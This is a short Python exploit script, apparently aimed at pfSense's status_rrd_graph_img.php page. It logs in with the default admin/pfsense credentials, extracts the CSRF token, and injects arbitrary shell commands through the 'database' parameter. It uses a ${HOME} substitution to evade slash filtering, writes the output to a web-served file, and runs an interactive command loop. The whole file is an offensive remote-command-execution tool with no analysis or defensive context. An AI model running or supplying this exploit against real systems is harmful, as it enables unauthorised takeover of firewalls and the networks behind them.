#!/usr/bin/python3

import requests
from requests import Session
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
login_session = Session()
url = "https://<address>/index.php"
target = "https://<address>/status_rrd_graph_img.php"
proxies = {"https":"http://127.0.0.1:8080"}

def login():
	username = "admin"
	password = "pfsense"
	headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
	resp = login_session.get(url, headers = headers, verify = False)
	csrf = re.findall("(<input type='hidden' name='__csrf_magic' value=\")(sid:[0-9a-z,A-Z]+)(;)", resp.text)[0][1]
	postdata = {"__csrf_magic":csrf, "usernamefld":username, "passwordfld":password, "login":"Login"}
	resp = login_session.post(url, data = postdata, verify = False)

def send_payload(cmd):
	if "/" in cmd:
		cmd = cmd.replace("/","${HOME}")

	payload = "queues; %s > ${HOME}usr${HOME}local${HOME}www${HOME}cmd.txt 2>&1" % cmd
	params = {"database":payload}
	resp = login_session.get(target, verify = False, params = params)


def recv_response():
	resp = login_session.get("https://<address>/cmd.txt", verify = False)
	send_payload("echo")
	print(resp.text)

if __name__ == "__main__":
	login()
	print("Type \"quit\" to exit shell...")
	cmd = input("cmd > ")
	while cmd.lower() != "quit":
		send_payload(cmd)
		recv_response()
		cmd = input("cmd > ")
